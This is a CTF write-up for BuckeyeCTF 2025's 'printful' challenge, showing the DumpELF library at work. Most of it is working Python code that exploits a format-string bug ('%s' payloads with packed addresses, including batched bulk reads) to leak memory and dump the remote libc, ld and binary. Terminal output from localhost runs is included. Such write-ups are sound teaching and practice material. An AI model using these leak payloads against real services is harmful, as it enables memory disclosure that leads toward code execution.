# intro
As a walkthrough, I will be showing how to use DumpELF on a real CTF challenge. The one I'll pick is [printful](https://github.com/cscosu/buckeyectf-2025-public/blob/master/pwn/printful/README.md) a pwn challenge from BuckeyeCTF 2025 with a very simple description:
```
# printful

No files... 🙃
nc xxxx.pwnoh.io <port>
```
No files! Only a port. Fun.

Upon connecting, we're met with a simple interface that is, you guessed it, an infinite loop format string bug:
```
corgo@dog-computer:~$ nc localhost 1024
Welcome to printful! Enter 'q' to quit
> hi
hi
> test
test
> %p!%p
0x57110fc9a00b!0x71
>
```

This gives us an arbitrary read (`%s`) and write (`%n`), but obviously without any kind of information about the environment we won't be able to do much. This is where DumpELF comes in! 

# libc dumping

First, we define a function that sends a line and returns its exact output:
```python
def do(payload):
    p.sendline(payload)
    return p.recv().removesuffix(b"> ")
```
next, another function that uses this to make a function that reads the bytes a an address `addr` using the format string bug:
```python
def dump_string(addr):
    if b"\n" in p64(addr):
        return b"\0"
    payload = b"%7$s".ljust(8, b"\x00") + p64(addr)
    return do(payload)+b'\x00' # null terminator
```
and that's all we have to do! We can now hook this up to DumpELF to leak the remote's libc/ld:
```python
#!/usr/bin/env python3

from dog import *

def do(payload):
    p.sendline(payload)
    return p.recv().removesuffix(b"> ")

def dump_string(addr):
    if b"\n" in p64(addr):
        return b"\0"
    payload = b"%7$s".ljust(8, b"\x00") + p64(addr)
    return do(payload)+b'\x00'

p = set_alias(remote("localhost",1024))
p.recvuntil(b"> ")

pie_leak = int(do(b"%p"), 16)
logx(pie_leak)

fun = DumpELF(dump_string,pie_leak)
libc = fun.libc
logx(libc.path)
```
we run this a few times (because we can't easily print addresses with `\n` in the name) until we get:
```bash
corgo@dog-computer:~/pwn/buckeye/printful$ python3 ./solve2.py
[+] Opening connection to localhost on port 1024: Done
[*] pie_leak=0x5969aa2d000b
[+] Downloading 'https://libc.rip/download/libc6_2.31-0ubuntu9.18_amd64.so': 1.94MB
[*] libc.path='/home/corgo/.cache/.pwntools-cache-3.12/libcdb/build_id/5792732f783158c66fb4f3756458ca24e46e827d'
[*] Closed connection to localhost port 1024
corgo@dog-computer:~/pwn/buckeye/printful$ cp /home/corgo/.cache/.pwntools-cache-3.12/libcdb/build_id/5792* ./libc.so.6
corgo@dog-computer:~/pwn/buckeye/printful$ dog fetch ./libc.so.6 --dbg # find and grab ld
/home/corgo/pwn/buckeye/printful/ld-2.31.so
[+] Debug symbols applied to ld '/home/corgo/pwn/buckeye/printful/ld-2.31.so'.
corgo@dog-computer:~/pwn/buckeye/printful$ ls ./libc.so.6 ./ld-2.31.so
./ld-2.31.so  ./libc.so.6
```
Just like that, we've retrieved the server's remote libc/ld! With this information, we can use the format string bug to overwrite something important in libc's memory and [get code execution](https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc).  
All of this has been mostly possible with pwntools already, and it's probably not what you came here for, so let's move onto the thing it doesn't do: dumping the program.

# program dumping
This one is much harder. Dumping the program involves getting over two hurdles:
- It's much faster to leak libc/ld-- we leak something identifiable like its build ID, then look that up on something like [libc.rip](https://libc.rip). This is a completely unique program, so this isn't possible.
- An ELF loaded in memory is much different than it is on disk-- only the parts necessary for the program to run are loaded, meaning multiple critical sections simply do not exist in memory.
DumpELF tries to solve the second problem for you with a best-attempt reconstruction, but the first is on us.  

We could go ahead with using `dump_string` to try and fully dump the program, but against a real server this would likely take well over an hour. ELFs are mostly null bytes, and since our leak ends on an null byte, DumpELF needs about *18 thousand* calls to `dump_string` to get enough information. We need to find a way to leak *significantly* more data per round-trip against the server.

From here, I'll go over two solutions to this that both independently reduce the amount of calls by ~8x.  

## arb read improvement
The first thing you should do is to try and improve your arbitrary read, if you can. For us, we can do this by sending multiple `%s` in our format string like so:
```python
def dump_qword(addr):
    start, end = '', b''
    cnt = 0
    skip = set()
    
    # first we build the payload. make a separate %s payload to leak each byte in 'addr'
    # skipping when that have '\x0a' in them
    for i in range(8):
        baddr = p64(addr+i)
        if b"\n" in baddr:
            skip.add(i)
            continue
        start += f'%{22+cnt}$s'+'QWERTYUIOPA' # delimit each %s so we know what's what
        end += baddr
        cnt += 1
    
    # pad it to ensure offsets are right
    payload = start.encode().ljust(128,b'\0') + end
    
    # split it
    leak = (do(payload)).split(b'QWERTYUIOPA')
    leak[-1] = b''
    
    # add skipped addrs as 'nothing'
    for i in sorted(skip):
        leak.insert(i,b'')

    # admittedly pretty gross
    # but build the final qword, looking in the previous leak when we hit a skip byte
    final = bytearray()
    for i in range(8):
        if i in skip: # if this is an \x0a addr
            if i > 0 and len(leak[i - 1]) > 1: # if the %s before it leaked 2+ characters
                final.append(leak[i - 1][1]) # use that second character
            else:
                final.append(0) # otherwise just assume \x00 and move on
        else: # if it's not
            chunk = leak[i] # we can just use the leaked data directly
            final.append(chunk[0] if chunk else 0)
            
    return bytes(final)
```
The code is admittedly a little grosser (mostly because of the banned `\n` requirement) but we now
consistently leak 8 bytes at a time instead of an unknown amount. We do this by sending 8 `%s` payloads each setup to read `addr`, `addr+1`, `addr+2`. We then set a large 'delimiter' between each of them (here `QWERTYUIOPA`), which means we get back something like this:
```python
b'qQWERTYUIOPA\nQWERTYUIOPAQWERTYUIOPAQWERTYUIOPAQWERTYUIOPAWQWERTYUIOPAeQWERTYUIOPAlQWERTYUIOPA'
```
By splitting this up into chunks based on the `QWERTYUIOPA` delimiter, we get:
```python
[b'q', b'\n', b'', b'', b'', b'W', b'e', b'l']
```
The indexes with nothing in them have to have null bytes at that address since nothing was printed, meaning we now know the data at that qword is
```python
b'q\n\x00\x00\x00Wel
```
It's slightly more complicated than this (we have to accurately leak addresses that contain `\x0a`, which we do by reading the second byte of `addr-1` if it's there), but that's the general idea.  
This significantly increases our speed from about ~18k calls down to ~2k. With this function, we can instead write:
```python
pie_leak = int(do(b"%p"), 16)
logx(pie_leak)
fun = DumpELF(dump_qword,pie_leak)
fun.dump("./printful.bin") # attempted ELF dump
```
DumpELF will use `dump_qword` to dump all the necessary bytes of the ELF, *attempt* (this is difficult) to reconstruct the original ELF, then write it to `./printful.bin`. Let's give it a shot!
```bash
corgo@dog-computer:~/pwn/buckeye/printful$ python3 ./solve2.py
[+] Opening connection to localhost on port 1024: Done
[*] pie_leak=0x59270f69c00b
[*] Closed connection to localhost port 1024
corgo@dog-computer:~/pwn/buckeye/printful$ pwnc patch --interp ./ld-2.31.so --rpath '$ORIGIN' ./printful.bin ./patch.bin
corgo@dog-computer:~/pwn/buckeye/printful$ chmod +x ./patch.bin
corgo@dog-computer:~/pwn/buckeye/printful$ ./patch.bin
Welcome to printful! Enter 'q' to quit
> %p! %p! %p! %p! %p! %p!
0x62fa9212100b! 0x71! 0xffff7fff! 0x7ffc02ee38b0! (nil)! 0x2021702520217025!

corgo@dog-computer:~/pwn/buckeye/printful$ nc localhost 1024
Welcome to printful! Enter 'q' to quit
> %p! %p! %p! %p! %p! %p!
0x597d63b0600b! 0x71! 0xffff7fff! 0x7ffeabc97df0! (nil)! 0x2021702520217025!
>
```
Would you look at that. We've perfectly recovered the program!

### bulk writes
Of course, the above optimization is not always possible, or it may not be enough for your situation. DumpELF offers a second idea: bulk writes. The idea is that you can likely trigger the arbitrary read multiple times in a single .send():
```python
>>> from dog import *
>>> p = process("./printful")
[x] Starting local process './printful'
[+] Starting local process './printful': pid 2114
>>> p.send(b"(%p)\n(%p)\n")
>>> p.recv()
b"Welcome to printful! Enter 'q' to quit\n> (0x6160ce3e500b)\n> (0x6160ce3e500b)\n> "
>>>
```
This can be used to *massively* reduce latency, because you're not waiting for server to respond to send your next payload anymore-- you're just sending a bunch at once, then parsing all the responses later.  
Of course, since you can now read a semi-arbitrary amount of bytes, you might want to know just how much you should read. To solve this, pass `bulk=True` to DumpELF like so:
```python
fun = DumpELF(bulk_dump,pie_leak, bulk=True)
```
Now the signature of `bulk_dump` is expected to be:
```python
def bulk_dump(addr,cnt):
    ...
```
where `addr` is the address we want to leak as before, and `cnt` is how many bytes DumpELF would *like* to read at that address. You can give less, you can give more, it's just a suggestion. `cnt` may be high, so I suggest capping it if your arbitrary read is relatively weak (like the one in this writeup):
```python
def bulk_dump(addr,cnt):
    cnt = min(0x50,cnt) # we can stabily leak 0x50 bytes at a time
    ...
```
Here's a correctly written `bulk_dump` for our situation. Again it is quite complicated due to format strings being difficult to work with for arbitrary reads, but hopefully you can make some sense of it:
```python
# make a format string payload to leak 8 bytes at 'addr'
def make_qword(addr):
    start, end = '', b''
    cnt = 0
    skip = set()
    
    # first we build the payload. make a separate %s payload to leak each byte in 'addr'
    # skipping when that have '\x0a' in them
    for i in range(8):
        baddr = p64(addr+i)
        if b"\n" in baddr:
            skip.add(i)
            continue
        start += f'%{23+cnt}$s'+'QWERTYUIOPA' # delimit each %s so we know what's what
        end += baddr
        cnt += 1
    # start 
    
    # pad it to ensure offsets are right
    start = (start.encode()+b'DELIMIT\0'+p64(0))[:0x80]
    payload = start + b'DELIMIT\0' + end
    return payload, skip

# given a leak from make_qword, and the bytes we should skip, parse the important bytes out
def parse_result(leak, skip):
    # logx(leak)
    for i in sorted(skip):
        leak.insert(i,b'')
    # logx(leak)

    # admittedly pretty gross
    # but build the final qword, looking in the previous leak when we hit a skip byte
    final = bytearray()
    for i in range(8):
        if i in skip: # if this is an \x0a addr
            if i > 0 and len(leak[i - 1]) > 1: # if the %s before it leaked 2+ characters
                final.append(leak[i - 1][1]) # use that second character
            else:
                final.append(0) # otherwise just assume \x00 and move on
        else: # if it's not
            chunk = leak[i] # we can just use the leaked data directly
            final.append(chunk[0] if chunk else 0)
    return bytes(final)

def bulk_dump(addr, cnt):
    cnt = min(0xf0,cnt) # adjust based on your findings. you may not even need a cap
    big = b''
    skips = []
    # separate 'cnt' into multiple make_qword payloads
    # to separate payloads, we write the word 'DELIMIT' at the end of each
    for x in range(0,cnt,8):
        pl, sk = make_qword(addr+x)
        skips.append(sk)
        big += pl + b'\0'*7+b'\n'
    p.send(big)
    
    result = p.recv()
    # we sent cnt//8 payloads, so we should expect cnt//8 'DELIMIT's in the output
    # keep receiving until we get everything we want
    while result.count(b'DELIMIT') != max(cnt//8,1):
        # print(result.count(b'DELIMIT'),cnt//8)
        result += p.recv()

    leaks = result.split(b'DELIMIT')
    if leaks[-1] == b'> ': # this is sometimes here at the end, it's just the prompt
        leaks.pop(-1)

    final = b''
    for leak, skip in zip(leaks,skips):
        leak = leak.removeprefix(b'> ')
        final += parse_result(leak.split(b'QWERTYUIOPA'),skip)
    # info(f"asked for {cnt} got {len(final)}")
    return final
```
The original `dump_qword` has been mostly unchanged, I've just split it up into two functions for usability. The only important thing I do now is write `DELIMIT` at the end of each format string payload we send at once, so that when we can correctly split up all the responses we get back.  
The other notable thing I do is this:
```python
result = p.recv()
while result.count(b'DELIMIT') != max(cnt//8,1):
    # print(result.count(b'DELIMIT'),cnt//8)
    result += p.recv()
```
The remote server will likely not send everything back at once. You should continue trying to read from the server until you get the amount of expected responses back. Here, since I sent `cnt//8` format string payloads with `DELIMIT` at the end, I keep asking for more data until `result` contains exactly that many `DELIMIT`s.  


With the ability to leak a near-arbitrary amount of data in a single .send(), your time-to-leak should drop significantly-- needing about 2000 calls from `dump_qword` to only 100 from `dump_bulk`. Here's the full solution making use of `bulk_write`:
```python
#!/usr/bin/env python3

from dog import *

def do(payload):
    p.sendline(payload)
    out = p.recv()
    # if len(out) == 2: # sometimes buffering means we only get the '> '
    #     return p.recv() # so this must be the actual response
    return out.removesuffix(b"> ")

def make_qword(addr):
    start, end = '', b''
    cnt = 0
    skip = set()
    
    # first we build the payload. make a separate %s payload to leak each byte in 'addr'
    # skipping when that have '\x0a' in them
    for i in range(8):
        baddr = p64(addr+i)
        if b"\n" in baddr:
            skip.add(i)
            continue
        start += f'%{23+cnt}$s'+'QWERTYUIOPA' # delimit each %s so we know what's what
        end += baddr
        cnt += 1
    # start 
    
    # pad it to ensure offsets are right
    start = (start.encode()+b'DELIMIT\0'+p64(0))[:0x80]
    payload = start + b'DELIMIT\0' + end
    return payload, skip

def parse_result(leak, skip):
    # logx(leak)
    for i in sorted(skip):
        leak.insert(i,b'')
    # logx(leak)

    # admittedly pretty gross
    # but build the final qword, looking in the previous leak when we hit a skip byte
    final = bytearray()
    for i in range(8):
        if i in skip: # if this is an \x0a addr
            if i > 0 and len(leak[i - 1]) > 1: # if the %s before it leaked 2+ characters
                final.append(leak[i - 1][1]) # use that second character
            else:
                final.append(0) # otherwise just assume \x00 and move on
        else: # if it's not
            chunk = leak[i] # we can just use the leaked data directly
            final.append(chunk[0] if chunk else 0)
    return bytes(final)

# bulk dump up to 0xf0 bytes at a time
def bulk_dump(addr, cnt):
    cnt = min(0xf0,cnt) # adjust based on your findings. you may not even need a cap
    big = b''
    skips = []
    # separate 'cnt' into multiple make_qword payloads
    # to separate payloads, we write the word 'DELIMIT' at the end of each
    for x in range(0,cnt,8):
        pl, sk = make_qword(addr+x)
        skips.append(sk)
        big += pl + b'\0'*7+b'\n'
    p.send(big)
    
    result = p.recv()
    # we sent cnt//8 payloads, so we should expect cnt//8 'DELIMIT's in the output
    # keep receiving until we get everything we want
    while result.count(b'DELIMIT') != max(cnt//8,1):
        # print(result.count(b'DELIMIT'),cnt//8)
        result += p.recv()

    leaks = result.split(b'DELIMIT')
    if leaks[-1] == b'> ': # this is sometimes here at the end, it's just the prompt
        leaks.pop(-1)

    final = b''
    for leak, skip in zip(leaks,skips):
        leak = leak.removeprefix(b'> ')
        final += parse_result(leak.split(b'QWERTYUIOPA'),skip)
    # info(f"asked for {cnt} got {len(final)}")
    return final


p = remote("localhost",1024)
# p = process("./printful")
p.recvuntil(b"> ")
pie_leak = int(do(b"%p"), 16)
fun = DumpELF(bulk_dump,pie_leak,bulk=True)
fun.dump("./printful4.bin") # it works!!!!
```
Hopefully you now understand how to correctly use this library!

# Final Notes
While this feature is pretty cool, I would only use it as a last-resort option where the original ELF is a NEED to solve the challenge. Leaking libc and performing some arbitrary write to RCE technique would've absolutely been enough to solve this challenge, I just used it as a testbed.  
If DumpELF fails to reconstruct the program after multiple tries, you can just try dumping all the memory you can leak to disk. It won't run, but IDA can load it (after some scolding) and the decompiler will still work. (Note that there won't be any function information and IDA will probably miss some!)  
If the two previous optimizations still aren't enough, you could *try* leaking the binary in multiple connections. I haven't tested this, it may completely break (especially on PIE binaries), but it's worth a shot.  
